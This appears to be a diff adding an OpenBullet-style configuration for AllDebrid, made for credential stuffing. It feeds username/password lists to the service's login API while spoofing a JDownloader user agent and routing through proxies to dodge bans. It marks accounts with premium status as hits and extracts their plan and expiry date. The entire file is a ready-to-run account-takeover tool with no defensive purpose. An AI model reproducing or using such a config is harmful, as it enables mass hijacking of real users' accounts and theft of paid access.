@@ -1,0 +1,57 @@
+[SETTINGS]
+{
+  "Name": "AllDebrid",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-07T18:47:30.4820663+02:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "sp6off",
+  "Version": "1.2.1.2",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Connect REQUEST POST "https://api.alldebrid.com/user/login" 
+  CONTENT "agent=JDownloader&username=\"<USER>\"&password=\"<PASS>\"" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: JDownloader 38606" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html" 
+  HEADER "Host: api.alldebrid.com" 
+  HEADER "Accept-Language: en-gb" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "Accept-Encoding: gzip" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"isPremium\":true" 
+  KEYCHAIN Failure OR 
+    KEY "\"error\":\"Invalid user or password\"" 
+  KEYCHAIN Ban OR 
+    KEY "\"Too many login attempts\"" 
+  KEYCHAIN Ban OR 
+    KEY "\"403 Forbidden\"" 
+  KEYCHAIN Ban OR 
+    KEY "\"307 Temporary Redirect\"" 
+
+#PARSE_PLAN PARSE "<SOURCE>" LR "\"isPremium\":" "," -> VAR "CurrentPlan" 
+
+#PARSE_DATE PARSE "<SOURCE>" LR "\"premiumUntil\":" "" -> VAR "premiumUntil" 
+
